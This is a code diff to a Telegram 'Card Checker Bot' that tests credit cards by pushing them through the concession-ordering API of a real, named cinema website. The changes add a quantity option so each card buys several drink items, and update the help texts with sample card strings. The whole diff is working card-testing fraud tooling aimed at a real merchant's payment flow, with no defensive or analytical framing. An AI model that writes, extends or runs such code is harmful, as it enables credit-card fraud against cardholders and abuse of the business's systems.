@@ -101,7 +101,17 @@ function safeJsonParse(data) {
 }
 
 function parseCard(card, validYYYY = 4) {
-    const parts = card.split('|');
+    // Check if quantity is included (format: CARD|MM|YYYY|CVV,QUANTITY)
+    let quantity = 1; // Default quantity
+    let cardData = card;
+    
+    if (card.includes(',')) {
+        const parts = card.split(',');
+        cardData = parts[0]; // Card data before comma
+        quantity = parseInt(parts[1]) || 1; // Quantity after comma (default to 1 if invalid)
+    }
+    
+    const parts = cardData.split('|');
     let [cc, mm, yyyy, cvv] = parts;
     
     if (yyyy.length === 4 && validYYYY === 2) {
@@ -110,7 +120,7 @@ function parseCard(card, validYYYY = 4) {
         yyyy = '20' + yyyy;
     }
     
-    return { cc, mm, yyyy, cvv };
+    return { cc, mm, yyyy, cvv, quantity };
 }
 
 async function sendMessage(chatId, text, markdown = false) {
@@ -243,7 +253,7 @@ app.post('/', async (req, res) => {
     // Handle commands
     if (text === '/start') {
         await sendMessage(chatId, 
-            "🤖 *Card Checker Bot*\n\n*Commands:*\n/check - Check a card\n/help - Show help\n\n*Format:*\nSend card as: `4350940005555920|07|2025`\nor `4350940005555920|07|2025|123`", 
+            "🤖 *Card Checker Bot*\n\n*Commands:*\n/check - Check a card\n/help - Show help\n\n*Format:*\n`CCNUMBER|MM|YYYY|CVV` or `CCNUMBER|MM|YYYY|CVV,QUANTITY`\n\n*Examples:*\n`4350940005555920|07|2025|123`\n`4350940005555920|07|2025|123,15` (with quantity)", 
             true
         );
         return res.sendStatus(200);
@@ -251,19 +261,19 @@ app.post('/', async (req, res) => {
 
     if (text === '/help') {
         await sendMessage(chatId, 
-            "📋 *Help*\n\n*Card Format:*\n`CCNUMBER|MM|YYYY|CVV`\n\n*Example:*\n`4350940005555920|07|2025|123`\n\nJust send the card to check!", 
+            "📋 *Help*\n\n*Card Format:*\n`CCNUMBER|MM|YYYY|CVV` or `CCNUMBER|MM|YYYY|CVV,QUANTITY`\n\n*Examples:*\n`4350940005555920|07|2025|123` (quantity: 1)\n`4350940005555920|07|2025|123,15` (quantity: 15)\n`4350940005555920|07|2025|123,30` (quantity: 30)\n\nJust send the card to check!", 
             true
         );
         return res.sendStatus(200);
     }
 
-    // Check if message contains card data
+    // Check if message contains card data (with optional quantity)
     if (/^\d{15,16}\|/.test(text)) {
         processCard(chatId, text);
         return res.sendStatus(200);
     } else {
         await sendMessage(chatId, 
-            "❌ Invalid format!\n\nPlease send card in format:\n`CCNUMBER|MM|YYYY|CVV`\n\nExample:\n`4350940005555920|07|2025|123`", 
+            "❌ Invalid format!\n\nPlease send card in format:\n`CCNUMBER|MM|YYYY|CVV` or `CCNUMBER|MM|YYYY|CVV,QUANTITY`\n\nExamples:\n`4350940005555920|07|2025|123`\n`4350940005555920|07|2025|123,15` (quantity 15)", 
             true
         );
         return res.sendStatus(200);
@@ -322,8 +332,10 @@ async function processCard(chatId, cardText) {
 
         await sendMessage(chatId, `⏳ Checking: \`${cardText}\`\n\nPlease wait...`, true);
 
-        const { cc, mm, yyyy, cvv } = parseCard(cardText, 4);
+        const { cc, mm, yyyy, cvv, quantity } = parseCard(cardText, 4);
         const yy = yyyy.length === 4 ? yyyy.substring(2) : yyyy;
+        
+        console.log(`Processing card with quantity: ${quantity}`);
 
         let retry = 0;
         let result = null;
@@ -374,12 +386,12 @@ async function processCard(chatId, cardText) {
                     throw new Error('Failed to extract authorization fingerprint');
                 }
 
-                // Step 3: Add Concessions
+                // Step 3: Add Concessions (with dynamic quantity)
                 await makeRequest(
                     'https://www.santacruzcinema.com/wp-json/wp/v2/api/content/vistaapi/AddConcessionsOrder',
                     {
                         post: true,
-                        postfields: `{"cinemaId":"2110","concessionItems":[{"Id":"144","HeadOfficeItemCode":"","HOPK":"144","Description":"BEER Santa Cruz Mtn Pacific IPA","DescriptionAlt":"","DescriptionTranslations":[],"ExtendedDescription":"","ExtendedDescriptionAlt":"","ExtendedDescriptionTranslations":[],"PriceInCents":950,"TaxInCents":84,"IsVariablePriceItem":false,"MinimumVariablePriceInCents":null,"MaximumVariablePriceInCents":null,"ItemClassCode":"0025","RequiresPickup":false,"CanGetBarcode":false,"ShippingMethod":"N","RestrictToLoyalty":false,"LoyaltyDiscountCode":"","RecognitionMaxQuantity":0,"RecognitionPointsCost":0,"RecognitionBalanceTypeId":null,"IsRecognitionOnly":false,"RecognitionId":0,"RecognitionSequenceNumber":0,"RecognitionExpiryDate":null,"RedeemableType":1,"IsAvailableForInSeatDelivery":false,"IsAvailableForPickupAtCounter":true,"VoucherSaleType":"","AlternateItems":[],"PackageChildItems":[],"ModifierGroups":[],"SmartModifiers":[],"DiscountsAvailable":[],"RecipeItems":[],"SellingLimits":{"DailyLimits":[],"IndefiniteLimit":null},"SellingTimeRestrictions":[],"RequiresPreparing":true,"is_restricted":false,"quantity":1,"IsSeatDelivery":false}],"userSessionId":"${userSessionId}","seats":[],"userID":""}`,
+                        postfields: `{"cinemaId":"2110","concessionItems":[{"Id":"706","HeadOfficeItemCode":"","HOPK":"706","Description":"SABE Paloma","DescriptionAlt":"","DescriptionTranslations":[],"ExtendedDescription":"","ExtendedDescriptionAlt":"","ExtendedDescriptionTranslations":[],"PriceInCents":1050,"TaxInCents":93,"IsVariablePriceItem":false,"MinimumVariablePriceInCents":null,"MaximumVariablePriceInCents":null,"ItemClassCode":"0050","RequiresPickup":false,"CanGetBarcode":false,"ShippingMethod":"N","RestrictToLoyalty":false,"LoyaltyDiscountCode":"","RecognitionMaxQuantity":0,"RecognitionPointsCost":0,"RecognitionBalanceTypeId":null,"IsRecognitionOnly":false,"RecognitionId":0,"RecognitionSequenceNumber":0,"RecognitionExpiryDate":null,"RedeemableType":1,"IsAvailableForInSeatDelivery":false,"IsAvailableForPickupAtCounter":true,"VoucherSaleType":"","AlternateItems":[],"PackageChildItems":[],"ModifierGroups":[],"SmartModifiers":[],"DiscountsAvailable":[],"RecipeItems":[],"SellingLimits":{"DailyLimits":[],"IndefiniteLimit":null},"SellingTimeRestrictions":[],"RequiresPreparing":true,"is_restricted":false,"quantity":${quantity},"IsSeatDelivery":false}],"userSessionId":"${userSessionId}","seats":[],"userID":""}`,
                         httpheader: ['content-type: application/json']
                     },
                     sessionId,
